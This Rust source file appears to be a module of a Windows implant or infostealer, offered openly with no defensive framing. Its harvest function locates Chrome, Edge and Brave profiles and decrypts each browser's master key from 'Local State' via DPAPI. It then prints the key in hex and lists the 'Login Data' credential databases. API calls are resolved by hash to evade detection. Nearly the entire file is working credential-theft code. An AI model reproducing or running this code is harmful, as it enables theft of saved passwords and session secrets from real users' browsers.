#[cfg(target_os = "windows")]
use crate::utils::api_resolver::{hash_str, resolve_function};
#[cfg(target_os = "windows")]
use crate::utils::windows_definitions::HANDLE;
use alloc::vec::Vec;

#[cfg(target_os = "windows")]
pub struct Browser;

#[cfg(target_os = "windows")]
impl Browser {
    pub fn harvest(&self) -> Result<Vec<u8>, ()> {
        let mut results = Vec::new();
        results.extend_from_slice(b"Scanning for browser data...\n");

        let paths = [
            r"Google\Chrome\User Data",
            r"Microsoft\Edge\User Data",
            r"BraveSoftware\Brave-Browser\User Data",
        ];

        let local_app_data = self.get_local_app_data();
        if local_app_data.is_empty() { 
            results.extend_from_slice(b"Failed to resolve LOCALAPPDATA\n");
            return Ok(results);
        }

        for browser_path in paths {
            let full_path = format!("{}\\{}", local_app_data, browser_path); 
            
            // 1. Check for Local State (contains Master Key)
            let local_state_path = format!("{}\\{}", full_path, "Local State");
            if self.file_exists(&local_state_path) {
                results.extend_from_slice(format!("Found Local State: {}\n", local_state_path).as_bytes());
                
                // Try to decrypt Master Key
                if let Ok(content) = self.read_file(&local_state_path) {
                    if let Ok(json) = serde_json::from_slice::<serde_json::Value>(&content) {
                        if let Some(key_b64) = json["os_crypt"]["encrypted_key"].as_str() {
                            if let Ok(mut key_bytes) = base64::engine::general_purpose::STANDARD.decode(key_b64) {
                                // DPAPI prefix is 5 bytes
                                if key_bytes.len() > 5 {
                                    let dpapi_blob = &key_bytes[5..]; // Skip "DPAPI"
                                    if let Ok(master_key) = self.decrypt_dpapi(dpapi_blob) {
                                        results.extend_from_slice(b"  [+] Decrypted Master Key: ");
                                        for b in &master_key {
                                            results.extend_from_slice(format!("{:02x}", b).as_bytes());
                                        }
                                        results.extend_from_slice(b"\n");
                                    } else {
                                        results.extend_from_slice(b"  [-] Failed to decrypt Master Key\n");
                                    }
                                }
                            }
                        }
                    }
                }
            }

            // 2. Check for Login Data in profiles
            let profiles = ["Default", "Profile 1", "Profile 2"];
            for profile in profiles {
                let login_data = format!("{}\\{}\\Login Data", full_path, profile);
                if self.file_exists(&login_data) {
                    results.extend_from_slice(format!("Found Credentials DB: {}\n", login_data).as_bytes());
                }
            }
        }

        Ok(results)
    }

    fn decrypt_dpapi(&self, ciphertext: &[u8]) -> Result<Vec<u8>, ()> {
        unsafe {
            let crypt32 = hash_str(b"crypt32.dll");
            let unprotect = resolve_function(crypt32, hash_str(b"CryptUnprotectData"));
            
            if unprotect.is_null() {
                // Try loading crypt32
                let k32 = hash_str(b"kernel32.dll");
                let load_lib = resolve_function(k32, hash_str(b"LoadLibraryA"));
                type FnLoadLibraryA = unsafe extern "system" fn(*const u8) -> HANDLE;
                let load_fn: FnLoadLibraryA = core::mem::transmute(load_lib);
                load_fn(b"crypt32.dll\0".as_ptr());
            }
            
            let unprotect = resolve_function(crypt32, hash_str(b"CryptUnprotectData"));
            if unprotect.is_null() { return Err(()); }

            #[repr(C)]
            struct DATA_BLOB {
                cbData: u32,
                pbData: *mut u8,
            }

            type FnCryptUnprotectData = unsafe extern "system" fn(
                *mut DATA_BLOB,
                *mut *mut u16,
                *mut DATA_BLOB,
                *mut c_void,
                *mut c_void,
                u32,
                *mut DATA_BLOB
            ) -> i32;

            let unprotect_fn: FnCryptUnprotectData = core::mem::transmute(unprotect);

            // Input Blob
            let mut in_blob = DATA_BLOB {
                cbData: ciphertext.len() as u32,
                pbData: ciphertext.as_ptr() as *mut u8,
            };

            // Output Blob
            let mut out_blob = DATA_BLOB {
                cbData: 0,
                pbData: core::ptr::null_mut(),
            };

            if unprotect_fn(&mut in_blob, core::ptr::null_mut(), core::ptr::null_mut(), core::ptr::null_mut(), core::ptr::null_mut(), 0, &mut out_blob) != 0 {
                let mut res = Vec::with_capacity(out_blob.cbData as usize);
                core::ptr::copy_nonoverlapping(out_blob.pbData, res.as_mut_ptr(), out_blob.cbData as usize);
                res.set_len(out_blob.cbData as usize);
                
                // Free memory using LocalFree (kernel32)
                let k32 = hash_str(b"kernel32.dll");
                let local_free = resolve_function(k32, hash_str(b"LocalFree"));
                type FnLocalFree = unsafe extern "system" fn(*mut c_void) -> *mut c_void;
                let free_fn: FnLocalFree = core::mem::transmute(local_free);
                free_fn(out_blob.pbData as *mut c_void);

                Ok(res)
            } else {
                Err(())
            }
        }
    }

    fn read_file(&self, path: &str) -> Result<Vec<u8>, ()> {
        unsafe {
            let k32 = hash_str(b"kernel32.dll");
            let create_file = resolve_function(k32, hash_str(b"CreateFileA"));
            let read_file = resolve_function(k32, hash_str(b"ReadFile"));
            let get_size = resolve_function(k32, hash_str(b"GetFileSize"));
            let close = resolve_function(k32, hash_str(b"CloseHandle"));

            if create_file.is_null() || read_file.is_null() || get_size.is_null() || close.is_null() { return Err(()); }

            type FnCreateFileA = unsafe extern "system" fn(*const u8, u32, u32, *mut c_void, u32, u32, *mut c_void) -> HANDLE;
            type FnReadFile = unsafe extern "system" fn(HANDLE, *mut u8, u32, *mut u32, *mut c_void) -> i32;
            type FnGetFileSize = unsafe extern "system" fn(HANDLE, *mut u32) -> u32;
            type FnCloseHandle = unsafe extern "system" fn(HANDLE) -> i32;

            let create_fn: FnCreateFileA = core::mem::transmute(create_file);
            let read_fn: FnReadFile = core::mem::transmute(read_file);
            let size_fn: FnGetFileSize = core::mem::transmute(get_size);
            let close_fn: FnCloseHandle = core::mem::transmute(close);

            let mut path_c = Vec::from(path.as_bytes());
            path_c.push(0);

            let h_file = create_fn(path_c.as_ptr(), 0x80000000, 1, core::ptr::null_mut(), 3, 0x80, core::ptr::null_mut());
            if h_file == (-1isize as *mut c_void) { return Err(()); }

            let size = size_fn(h_file, core::ptr::null_mut());
            if size == 0xFFFFFFFF {
                close_fn(h_file);
                return Err(());
            }

            let mut buf = alloc::vec![0u8; size as usize];
            let mut read = 0;
            if read_fn(h_file, buf.as_mut_ptr(), size, &mut read, core::ptr::null_mut()) == 0 {
                close_fn(h_file);
                return Err(());
            }

            close_fn(h_file);
            buf.truncate(read as usize);
            Ok(buf)
        }
    }

    fn get_local_app_data(&self) -> alloc::string::String {
        unsafe {
            let k32 = hash_str(b"kernel32.dll");
            let get_env = resolve_function(k32, hash_str(b"GetEnvironmentVariableA"));
            if get_env.is_null() { return alloc::string::String::new(); }

            type FnGetEnvironmentVariableA = unsafe extern "system" fn(*const u8, *mut u8, u32) -> u32;
            let get_env_fn: FnGetEnvironmentVariableA = core::mem::transmute(get_env);

            let mut buf = [0u8; 260];
            let n = get_env_fn(b"LOCALAPPDATA\0".as_ptr(), buf.as_mut_ptr(), 260);
            if n > 0 {
                return alloc::string::String::from_utf8_lossy(&buf[..n as usize]).into_owned();
            }
        }
        alloc::string::String::new()
    }

    fn file_exists(&self, path: &str) -> bool {
        unsafe {
            let k32 = hash_str(b"kernel32.dll");
            let get_file_attrs = resolve_function(k32, hash_str(b"GetFileAttributesA"));
            if get_file_attrs.is_null() { return false; }

            type FnGetFileAttributesA = unsafe extern "system" fn(*const u8) -> u32;
            let get_file_attrs_fn: FnGetFileAttributesA = core::mem::transmute(get_file_attrs);

            let mut path_c = Vec::from(path.as_bytes());
            path_c.push(0);
            let attrs = get_file_attrs_fn(path_c.as_ptr());
            attrs != 0xFFFFFFFF
        }
    }
}

#[cfg(not(target_os = "windows"))]
pub struct Browser;

#[cfg(not(target_os = "windows"))]
impl Browser {
    pub fn harvest(&self) -> Result<Vec<u8>, ()> {
        Ok(alloc::vec::Vec::from(b"Browser harvesting not supported on Linux" as &[u8]))
    }
}
